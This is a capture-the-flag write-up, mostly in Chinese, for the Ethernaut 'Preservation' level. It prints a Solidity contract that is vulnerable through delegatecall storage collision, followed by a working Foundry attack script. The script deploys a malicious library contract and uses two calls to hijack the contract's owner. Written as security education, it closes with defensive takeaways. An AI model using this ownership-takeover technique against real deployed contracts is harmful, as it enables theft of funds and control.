# Ethernaut CTF Writeup

## Level 16 Preservation

> 題目: https://ethernaut.openzeppelin.com/level/0x35b28CB86846382Aa6217283F12C13657FF0110B

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

過關條件: 

- 此智能合約利用一個函式庫來儲存兩個不同時區的兩個不同時間。 
- 建構函數會為每個要儲存的時間創建兩個庫實例。 
- 本關卡的目標是獲得該合約的所有權。

解法：

- 部署一個惡意合約: 創建一個類似 `LibraryContract` 的惡意合約，該合約的 `setTime` 函數會修改 `owner` 變量。

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Preservation, LibraryContract} from "../src/level16/Preservation.sol";

contract MaliciousContract {
    address public _timeZone1Library;  // slot 0
    address public _timeZone2Library;  // slot 1
    address public owner;              // slot 2

    function setTime(uint256 _time) public {
        owner = msg.sender;
    }
}

contract Attack is Script {
    Preservation public target;
    MaliciousContract public malicious;
   
    function run() public {
        vm.startBroadcast();

        target = Preservation(payable(0x04e3970206f92baf0B8556B62Bd1c847d6906035));
        malicious = new MaliciousContract();
        console.log(target.owner());
        target.setFirstTime(uint256(uint160(address(malicious))));
        target.setFirstTime(1);
        console.log(target.owner());

        vm.stopBroadcast();
    }
}

```

Takeaways:

- 使用 delegatecall 調用庫可能存在風險
- 應該使用 library 關鍵字來構建庫，因為它可以防止庫存儲和訪問狀態變量